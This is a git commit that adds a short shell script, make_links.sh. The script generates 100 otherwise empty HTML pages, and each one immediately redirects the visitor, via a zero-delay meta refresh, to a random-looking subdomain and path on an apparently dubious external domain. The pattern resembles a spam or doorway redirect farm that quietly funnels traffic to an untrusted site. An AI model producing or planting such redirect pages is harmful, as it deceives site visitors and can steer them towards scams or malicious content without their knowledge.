ebf1250a8976c086b7d582b9a0fd64b16fb88c77
torr <orbanhvictor@gmail.com>
2025-08-12 16:05:20 +1000

    Add 100 link pages

---
+++ make_links.sh
@@ -0,0 +1,6 @@
+for i in $(seq 1 100); do
+  mkdir -p link$i
+  echo "<!doctype html><html><head><meta charset='utf-8'><meta http-equiv='refresh' content='0; url=https://x7317nv.best-connectionsweet.com/gxt2m3x'></head><body></body></html>" > link$i/index.html
+done
+
+
